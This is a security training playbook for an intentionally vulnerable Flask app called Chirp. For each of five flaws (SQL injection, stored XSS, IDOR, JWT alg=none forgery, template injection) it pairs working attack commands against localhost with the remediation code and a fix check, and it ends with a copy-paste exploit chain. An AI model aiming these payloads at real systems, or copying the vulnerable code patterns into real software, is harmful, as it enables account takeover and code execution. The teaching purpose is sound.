# Chirp — Security Assessment Playbook

A single, ordered walkthrough for demonstrating and then fixing the five
intentional vulnerabilities in Chirp. Each section pairs the **attack** with
its **remediation** and a way to **confirm the fix**, so the same document
drives both the penetration demo and the remediation demo.

Source material: [VULNERABILITIES.md](VULNERABILITIES.md) (exploits) and
[PATCHES.md](PATCHES.md) (fixes). This file reorganizes them into one flow.

> ⚠️ **Scope.** Chirp is intentionally insecure and for isolated, offline
> training only. Run it on `127.0.0.1`, never on a public network, and never
> with real credentials or data. Attack only systems you own or are authorized
> to test.

---

## Part 0 — Vulnerabilities at a glance

| # | Vulnerability | Endpoint | Flag |
|---|---------------|----------|------|
| V1 | SQL Injection (auth bypass) | `POST /login` | — |
| V2 | Stored XSS | tweet body on `/` | — |
| V3 | IDOR | `GET /api/dm/<id>` | `FLAG{idor_lets_you_read_my_dms}` |
| V4 | Broken auth (JWT `alg=none`) | `GET /admin` via forged cookie | `FLAG{alg_none_made_you_admin}` |
| V5 | Server-Side Template Injection (→ RCE) | profile bio on `/user/<name>` | — |

Suggested assessment order (also the escalation path): **V1 → V3 → V4 → V2 → V5**.

---

## Part 1 — Lab setup

### 1.1 Start the vulnerable target

```bash
cd chirp
python3 seed.py            # creates chirp.db with demo users + flags
python3 app.py             # serves the target on http://127.0.0.1:5000
```

Leave that terminal running. Use a second terminal for the attack commands.

### 1.2 Demo accounts

| user  | password            | note          |
|-------|---------------------|---------------|
| admin | `S3cr3t_@dm1n_2026` | owns `/admin` |
| alice | `password123`       | regular user  |
| bob   | `hunter2`           | regular user  |

### 1.3 (Optional) Start the fixed target for the remediation demo

```bash
python3 seed.py --fixed    # creates chirp_fixed.db with hashed passwords
python3 app_fixed.py       # serves the hardened app on http://127.0.0.1:5051
```

`app_fixed.py` reads `CHIRP_SECRET_KEY` from the environment; if unset it
generates a random key per restart. Re-run each attack against port `5051`
and it should fail.

---

## Part 2 — Attack + Remediation, vulnerability by vulnerability

### V1 — SQL Injection (authentication bypass)

**Why it is vulnerable.** The `/login` handler concatenates input directly
into the SQL string, so `username` can close the literal and comment out the
password check.

```python
query = ("SELECT * FROM users WHERE username = '%s' AND password = '%s'"
         % (username, password))
```

#### Attack steps

1. Log in as `admin` with no valid password:

   ```bash
   curl -i -c cj.txt -d "username=admin' --&password=x" \
     http://127.0.0.1:5000/login
   ```

2. The resulting query is `... WHERE username = 'admin' --' AND password = 'x'`.
   The `--` comments out the password clause, the `admin` row is returned, and
   the response sets a valid `session` cookie (saved to `cj.txt`).

3. **Proof:** you are now authenticated as `admin` without knowing the password.

   ```bash
   curl -b cj.txt http://127.0.0.1:5000/admin
   ```

**Impact.** Full authentication bypass; `UNION`-based payloads can exfiltrate
the whole `users` table including plaintext passwords.

#### Remediation steps

1. Replace string-built SQL with a parameterized (bound) query.
2. Never store plaintext passwords — hash them and verify the hash.

```python
# Before
query = ("SELECT * FROM users WHERE username = '%s' AND password = '%s'"
         % (username, password))
row = db.execute(query).fetchone()

# After
from werkzeug.security import check_password_hash
row = db.execute(
    "SELECT * FROM users WHERE username = ?", (username,)
).fetchone()
if row and check_password_hash(row["password"], password):
    ...
```

3. **Confirm the fix:** `admin' --` must be rejected, and the correct password
   must still work.

   ```bash
   # exploit fails (no session set)
   curl -i -d "username=admin' --&password=x" http://127.0.0.1:5051/login
   # legitimate login succeeds
   curl -i -d "username=admin&password=S3cr3t_@dm1n_2026" \
     http://127.0.0.1:5051/login
   ```

> **Principle:** separate code from data — let the driver bind values; never
> interpolate input into a query string.

---

### V2 — Stored XSS (persistent)

**Why it is vulnerable.** The shared post macro renders the tweet body with
`| safe`, which disables Jinja auto-escaping, so stored markup executes for
every visitor.

```jinja
<div class="post-body">{{ tweet['body'] | safe }}</div>
```

#### Attack steps

1. While signed in (reuse the V1 session), post a script as the tweet body:

   ```bash
   curl -b cj.txt -d "body=<script>alert(document.cookie)</script>" \
     http://127.0.0.1:5000/tweet
   ```

2. Open `http://127.0.0.1:5000/` in a browser.

3. **Proof:** the script executes in each viewer's session (a popup appears and
   `document.cookie` is readable). The same payload also fires on the author's
   profile page.

**Impact.** Session-cookie theft, feed defacement, and forced actions as the
victim. "Stored" because the payload lives in the DB and is served to everyone.

#### Remediation steps

1. Remove `| safe` so Jinja auto-escapes the body.
2. If limited HTML is genuinely required, sanitize on input with an allowlist
   (e.g. `bleach`) instead of disabling escaping.
3. Defense in depth: send a Content-Security-Policy header.

```jinja
{# Before #}
<div>{{ t['body'] | safe }}</div>

{# After — Jinja escapes < > & " ' automatically #}
<div>{{ t['body'] }}</div>
```

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

4. **Confirm the fix:** the same payload is stored/rendered as inert text, and
   no popup appears on the feed or the profile.

> **Principle:** escape contextually on output; treat all stored content as
> untrusted when rendering.

---

### V3 — IDOR (Insecure Direct Object Reference)

**Why it is vulnerable.** `/api/dm/<id>` authenticates the caller but never
checks that the message belongs to them.

```python
dm = db.execute("SELECT * FROM dms WHERE id = ?", (dm_id,)).fetchone()
```

#### Attack steps

1. As *any* logged-in user (e.g. the V1 admin session), walk the id space:

   ```bash
   curl -b cj.txt http://127.0.0.1:5000/api/dm/2
   ```

2. **Proof:** the DM between two other users is returned, including the flag:

   ```json
   {"from":"admin","id":2,"message":"FLAG{idor_lets_you_read_my_dms}","to":"alice"}
   ```

**Impact.** Any user can read every DM in the system by incrementing the id.

#### Remediation steps

1. Scope the query to the requesting user (sender or recipient).
2. Return `404` (not `403`) on failure so the response does not confirm the row
   exists.

```python
# After
dm = db.execute(
    "SELECT * FROM dms WHERE id = ? AND (sender = ? OR recipient = ?)",
    (dm_id, user["username"], user["username"]),
).fetchone()
if not dm:
    abort(404)
```

3. **Confirm the fix:** the foreign DM returns `404` while your own DMs still
   return `200`.

   ```bash
   curl -o /dev/null -w "%{http_code}\n" -b cj.txt http://127.0.0.1:5051/api/dm/2
   # -> 404
   ```

> **Principle:** authenticate **and** authorize — every object access must be
> checked against who is asking. Never rely on ids being unguessable.

---

### V4 — Broken authentication (JWT `alg=none` confusion)

**Why it is vulnerable.** `verify_token()` trusts the `alg` field supplied
*inside* the token. When it says `none`, signature verification is skipped
entirely.

```python
if header.get("alg") == "none":
    return payload.get("user")      # no signature check
```

#### Attack steps

1. Forge an unsigned token claiming to be `admin` (note the empty signature
   segment after the final dot):

   ```bash
   FORGED=$(python3 - <<'PY'
   import base64, json
   b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
   h = b(json.dumps({"alg":"none","typ":"CHIRP"}).encode())
   p = b(json.dumps({"user":"admin"}).encode())
   print(f"{h}.{p}.")
   PY
   )
   ```

2. Send it as the session cookie and hit the admin page:

   ```bash
   curl -b "session=$FORGED" http://127.0.0.1:5000/admin
   ```

3. **Proof:** `/admin` renders the user table and exposes
   `FLAG{alg_none_made_you_admin}`.

**Impact.** Complete identity forgery — become any user, including `admin`,
without the signing key or any password.

#### Remediation steps

1. Pin the algorithm server-side and always require a valid signature; never
   honor `alg=none`.
2. Better: use a vetted library (PyJWT) with an explicit algorithm allowlist.
3. Use a long, random secret — not a hard-coded string — and short token
   lifetimes. Prefer framework sessions over hand-rolled tokens.

```python
# After (hand-rolled fix): never honor alg=none; always verify HMAC
def verify_token(token):
    try:
        h_b64, p_b64, sig_b64 = token.split(".")
        expected = hmac.new(SECRET, f"{h_b64}.{p_b64}".encode(),
                            hashlib.sha256).digest()
        if not hmac.compare_digest(expected, b64url_decode(sig_b64)):
            return None
        return json.loads(b64url_decode(p_b64)).get("user")
    except Exception:
        return None

# Even better with PyJWT:
#   jwt.decode(token, SECRET, algorithms=["HS256"])   # rejects alg=none
```

4. **Confirm the fix:** the forged token gets `403`, and freshly signed sessions
   still work for legitimate users.

> **Principle:** the server decides the algorithm, not the token. Prefer
> audited libraries over hand-rolled crypto.

---

### V5 — Server-Side Template Injection (→ RCE)

**Why it is vulnerable.** `profile()` concatenates the user-controlled bio into
a template string and compiles it, so Jinja expressions in the bio execute
server-side.

```python
bio_html = render_template_string(
    "<div class='bio'>" + (row["bio"] or "") + "</div>"
)
```

#### Attack steps

1. Set a bio containing a Jinja expression:

   ```bash
   curl -b cj.txt --data-urlencode "bio={{7*7}}" \
     http://127.0.0.1:5000/settings
   ```

2. View the profile — the expression is evaluated:

   ```bash
   curl -b cj.txt http://127.0.0.1:5000/user/admin
   #   <div class='bio'>49</div>
   ```

3. **Proof of escalation.** Replace the bio to leak config/secrets and then
   reach code execution via Python object introspection:

   ```jinja
   {{ config.items() }}
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```

**Impact.** Remote code execution on the host — the most severe of the five.

#### Remediation steps

1. Never build a template from user input.
2. Pass the bio as *data* into a static template, where it is auto-escaped.
3. Ensure the template renders it with `{{ bio }}` (no `| safe`).

```python
# Before
bio_html = render_template_string("<div class='bio'>" + row["bio"] + "</div>")
return render_template("profile.html", bio_html=bio_html, ...)

# After — pass bio as a context variable
return render_template("profile.html", bio=row["bio"], ...)
```

```jinja
{# profile.html — escaped automatically #}
<div class="bio">{{ bio }}</div>
```

4. **Confirm the fix:** the expression stays literal and HTML in the bio is
   escaped.

   ```bash
   curl -b cj.txt --data-urlencode "bio={{7*7}}" http://127.0.0.1:5051/settings
   curl -b cj.txt http://127.0.0.1:5051/user/admin
   #   <div class="bio">{{7*7}}</div>   (rendered as text, not 49)
   ```

> **Principle:** templates are code. User input is data and must never be
> concatenated into, or evaluated as, a template.

---

## Part 3 — End-to-end demonstration (copy-paste)

Run against the vulnerable app on port 5000, using one shell:

```bash
BASE=http://127.0.0.1:5000

# V1 — SQLi login bypass, save session cookie
curl -s -c cj.txt -d "username=admin' --&password=x" "$BASE/login" >/dev/null

# V3 — IDOR: read another user's DM
curl -s -b cj.txt "$BASE/api/dm/2"
#   {"from":"admin","id":2,"message":"FLAG{idor_lets_you_read_my_dms}","to":"alice"}

# V4 — forge alg=none admin token
FORGED=$(python3 - <<'PY'
import base64, json
b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
h = b(json.dumps({"alg":"none","typ":"CHIRP"}).encode())
p = b(json.dumps({"user":"admin"}).encode())
print(f"{h}.{p}.")
PY
)
curl -s -b "session=$FORGED" "$BASE/admin" | grep -o 'FLAG{alg_none_made_you_admin}'

# V2 — stored XSS (then open $BASE in a browser to see it fire)
curl -s -b cj.txt -d "body=<script>alert(document.cookie)</script>" \
  "$BASE/tweet" >/dev/null

# V5 — SSTI: confirm code evaluation, then escalate to RCE via introspection
curl -s -b cj.txt --data-urlencode "bio={{7*7}}" "$BASE/settings" >/dev/null
curl -s -b cj.txt "$BASE/user/admin" | grep -o '49'
```

Then re-run the same sequence against the fixed app on port 5051
(`BASE=http://127.0.0.1:5051`) and confirm every step fails.

---

## Part 4 — Remediation summary & hardening checklist

| # | Root cause | Fix |
|---|-----------|-----|
| V1 | String-built SQL | Parameterized queries + hashed passwords |
| V2 | Output rendered with `\| safe` | Auto-escape output; add CSP |
| V3 | Object fetched with no ownership check | Scope query to current user; authorize every access |
| V4 | Server trusts client-supplied `alg` | Pin algorithm; require signature; vetted library |
| V5 | User input compiled as a template | Pass input as data into a static template |

General hardening:

- Parameterize every query (V1).
- Escape all output; add a CSP (V2).
- Authorize every object access, not just authenticate (V3).
- Pin crypto algorithms; use vetted auth libraries; strong random secrets (V4).
- Never treat user input as code or templates (V5).
- Hash passwords with `generate_password_hash`; never store plaintext.
- Turn off `debug=True` outside local dev (the Werkzeug console is an RCE path).
- Set cookies `HttpOnly`, `Secure`, and `SameSite`.

---

## Part 5 — Assessment sign-off checklist

- [ ] V1: `admin' --` bypasses login on the target, is rejected on the fix.
- [ ] V2: script body executes on the feed, is escaped after the fix.
- [ ] V3: foreign DM id returns the flag, returns `404` after the fix.
- [ ] V4: forged `alg=none` token reaches `/admin`, is rejected after the fix.
- [ ] V5: `{{7*7}}` evaluates to `49`, stays literal after the fix.
- [ ] Legitimate logins, pages, and assets still work on the fixed build.

> Harness note: `verify_demo.py` automates the checks above. Its V5
> fixed-edition assertion currently fails because it compares against
> `html.escape` (`&quot;`) while Jinja emits `&#34;` — a test bug, not a
> residual vulnerability. It also errors on Windows during temp-dir cleanup
> (`WinError 32`). See the file for details.
